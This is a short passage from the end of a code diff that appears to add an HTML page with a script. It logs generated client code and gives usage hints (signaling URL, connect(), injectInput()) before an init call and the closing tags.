+            log(cId, 'Custom client code generated:', 'success');
+            log(cId, clientCode, 'data');
+            log(cId, '', 'info');
+            log(cId, 'To use: Instantiate with signaling URL, call connect(), then use injectInput() to send commands.', 'info');
+        }
+
+        // ===================================================================
+        // INIT
+        // ===================================================================
+        updateStats();
+    </script>
+</body>
+</html>
